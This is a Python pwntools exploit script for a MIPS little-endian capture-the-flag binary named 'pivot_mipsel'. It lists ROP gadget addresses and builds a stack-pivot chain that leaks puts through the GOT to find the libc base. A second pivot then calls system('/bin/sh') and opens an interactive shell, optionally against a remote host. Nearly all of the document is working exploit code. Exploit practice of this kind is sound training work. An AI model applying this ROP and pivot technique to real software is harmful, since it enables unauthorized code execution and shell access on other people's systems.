from pwn import *

splash()
elf = context.binary = ELF("./pivot_mipsel")
libc = ELF("/usr/mipsel-linux-gnu/lib/libc.so.6")


class ROP:
    pivot   = 0x00400cd0  # move sp,fp; lw ra,8(sp); lw fp,4(sp); jr ra; addiu sp,sp,12;
    lw_fp   = 0x00400cd4  # lw ra,8(sp); lw $fp, 4($sp); jr $ra; addiu $sp, $sp, 0xc;
    lw_a0   = 0x00400a84  # lw $a0, 0x18($fp); lw $v0, -0x7f9c($gp); move $t9, $v0; jalr $t9; nop;
    gadget1 = 0x00400a7c  # lw gp,16(s8); sw zero,28(s8); lw $a0, 0x18($fp); lw $v0, -0x7f9c($gp); move $t9, $v0; jalr $t9; nop;
    pivot2  = 0x00400ab4  # lw gp,16(s8); move v0,zero; move sp,s8; lw ra,36(sp); lw s8,32(sp); addiu sp,sp,40; jr ra; nop
    mov_ao  = 0x00400b00  # move a0,v0; lw v0,-32700(gp); move	t9,v0; jalr	t9; nop
    lw_s3   = 0x00400958  # lw ra, 44(sp); lw $s3, 0x28($sp); lw $s2, 0x24($sp); lw $s1, 0x20($sp); lw $s0, 0x1c($sp); jr $ra; addiu $sp, $sp, 0x30;
    jalr1   = 0x00400ca0  # lw t9,8(sp); lw t0,4(sp); jalr t9; addiu sp,sp,12;
    jalr2   = 0x00400cb0  # lw t9,8(sp); lw t2,4(sp); lw t1,0(t2); jalr t9; addiu sp,sp,12;
    csu_rop = 0x00400d64


class LIBC_ROPS:
    lw_a0   = 0x00029d40  # lw $a0, 0x1c($sp); lw $t9, 0x30($sp); jalr $t9; nop;


"""
  400d64:	02602025 	move	a0,s3
  400d68:	1651fff9 	bne	s2,s1,400d50 <__libc_csu_init+0x60>
  400d6c:	26100004 	addiu	s0,s0,4
  400d70:	8fbf0034 	lw	ra,52(sp)
  400d74:	8fb50030 	lw	s5,48(sp)
  400d78:	8fb4002c 	lw	s4,44(sp)
  400d7c:	8fb30028 	lw	s3,40(sp)
  400d80:	8fb20024 	lw	s2,36(sp)
  400d84:	8fb10020 	lw	s1,32(sp)
  400d88:	8fb0001c 	lw	s0,28(sp)
  400d8c:	03e00008 	jr	ra
  400d90:	27bd0038 	addiu	sp,sp,56
"""


def conn():
    if args.LOCAL:
        pty = process.PTY
        return process(elf.path, stdin=pty, stdout=pty, stderr=pty)
    elif args.GDB:
        return gdb.debug(elf.path)
    else:
        return remote(args.HOST, args.PORT)


def extract_pivot(io):
    io.recvuntil(b"upon you a place to pivot: ")
    return int(io.recvline()[:-1], 16)


def solve():
    io = conn()

    padding = cyclic(32)

    pivot_point = extract_pivot(io)
    log.info(f"Pivot point: {hex(pivot_point)}")

    log.info(f"Puts plt: {hex(elf.plt.puts + 0x7f9c)}")
    log.info(f"Data start plt: {hex(elf.sym.data_start)}")

    payload = [
        0xDEADBEEF,
        pivot_point,  # FP
        ROP.lw_s3,
        0xDEADBEEF,
        0xDEADBEEF,
        0xDEADBEEF,
        0xDEADBEEF,
        0xDEADBEEF,
        0xDEADBEEF,
        0xDEADBEEF,
        0xD00DF00D,  # s0
        1,           # s1
        1,           # s2
        elf.got.puts,
        ROP.csu_rop,
        0xDEADBEEF,
        0xDEADBEEF,
        0xDEADBEEF,
        0xDEADBEEF,
        0xDEADBEEF,
        0xDEADBEEF,
        0xDEADBEEF,
        0,
        1,
        2,
        3,
        4,
        5,
        ROP.jalr1,
        0xDEADBEEF,
        0,
        elf.plt.puts + 4,
        0xDEADBEEF,
        elf.sym.data_start,
        elf.sym.main
    ]

    stack_pivot = [
        padding,
        pivot_point,  # FP points here for above rop allowing for pivot
        ROP.pivot,
    ]

    log.info(f"Payload size: {len(flat(payload))}")

    io.send(flat(payload))
    io.send(flat(stack_pivot))

    io.recvuntil(b"Thank you!\n")
    io.recvuntil(b"Thank you!\n")
    leak = int.from_bytes(io.recv(4), "little")
    libc.address = leak - libc.sym.puts

    log.info(f"Libc base: {hex(libc.address)}")

    pivot_point2 = extract_pivot(io)
    log.info(f"Pivot 2: {hex(pivot_point2)}")

    log.info(f"System: {hex(libc.sym.system)}")
    print(hex(next(libc.search(b"/bin/sh"))))

    payload2 = [
        0xCAFEBABE,
        pivot_point2,
        LIBC_ROPS.lw_a0 + libc.address,
        0xCAFEBABE,
        next(libc.search(b"/bin/sh")),
        next(libc.search(b"/bin/sh")),
        next(libc.search(b"/bin/sh")),
        next(libc.search(b"/bin/sh")),
        next(libc.search(b"/bin/sh")),
        next(libc.search(b"/bin/sh")),
        next(libc.search(b"/bin/sh")),
        next(libc.search(b"/bin/sh")),
        next(libc.search(b"/bin/sh")),
        next(libc.search(b"/bin/sh")),
        next(libc.search(b"/bin/sh")),
        libc.sym.system,  # a0 next(libc.search(b"/bin/sh"))
    ]

    stack_pivot2 = [
        padding,
        pivot_point2,
        ROP.pivot  # move sp,fp; lw ra,8(sp); lw fp,4(sp); jr ra; addiu sp,sp,12;
    ]

    io.send(flat(payload2))
    io.send(flat(stack_pivot2))

    io.interactive()


if __name__ == "__main__":
    solve()